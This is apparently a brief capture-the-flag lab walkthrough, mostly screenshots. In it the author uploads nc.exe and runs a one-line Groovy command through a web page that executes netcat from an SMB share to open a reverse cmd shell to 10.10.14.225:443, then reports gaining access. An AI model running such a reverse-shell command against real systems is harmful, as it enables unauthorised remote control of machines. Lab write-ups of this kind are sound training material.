![](<attachments/Pasted image 20260109092741.png>)
![](<attachments/Pasted image 20260109092846.png>)
![](<attachments/Pasted image 20260109092954.png>)

![](<attachments/Pasted image 20260109093120.png>)

We are going to upload this file: `nc.exe`.

![](<attachments/Pasted image 20260109093529.png>)

```powershell
println "\\10.10.14.225\smbFolder\nc.exe -e cmd 10.10.14.225 443".execute().text
```

![](<attachments/Pasted image 20260109094840.png>)

Alright, we now have access to the machine thanks to the web page.

![](<attachments/Pasted image 20260109095802.png>)
